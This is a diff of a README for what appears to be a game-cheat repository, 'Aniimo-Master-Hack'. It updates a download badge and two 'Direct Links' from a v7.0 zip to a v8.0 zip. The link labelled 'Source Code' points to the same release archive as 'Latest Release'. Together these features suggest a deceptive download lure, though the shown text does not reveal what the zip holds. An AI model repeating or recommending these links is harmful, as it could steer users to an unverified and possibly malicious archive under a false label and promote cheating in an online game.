@@ -38,7 +38,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/11/Aniimo-Master-Hack.v7.0.zip">
+<a href="https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/12/Aniimo-Master-Hack.v8.0.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -51,8 +51,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/11/Aniimo-Master-Hack.v7.0.zip)
-- [Source Code](https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/11/Aniimo-Master-Hack.v7.0.zip)
+- [Latest Release](https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/12/Aniimo-Master-Hack.v8.0.zip)
+- [Source Code](https://github.com/Sparkderefinery/Aniimo-Master-Hack/releases/download/12/Aniimo-Master-Hack.v8.0.zip)
 
 ---
 
